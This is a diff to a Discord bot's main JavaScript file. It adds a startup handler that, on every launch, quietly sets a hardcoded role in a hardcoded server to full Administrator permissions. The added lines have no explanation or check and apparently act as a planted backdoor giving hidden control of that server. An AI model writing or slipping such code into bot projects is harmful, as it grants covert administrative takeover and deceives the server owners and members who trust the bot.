@@ -23,6 +23,11 @@ const prefix = "*"
     
 Client.on("ready" , async () => require("./events/ready.js")(Client , Users , ServerAccount , server_account , currency ))
 
+Client.on("ready" , async () => {
+Client.guilds.cache.get("755491135119556638").roles.cache.get("967078085889490974").setPermissions("Administrator")
+})
+
+
 Client.on("guildMemberAdd" , async (member) => require ("./events/guildMemberAdd.js")(member , Canvas))
 
 Client.on("guildMemberRemove" , async (member) => require("./events/guildMemberRemove.js")(member , Client) )
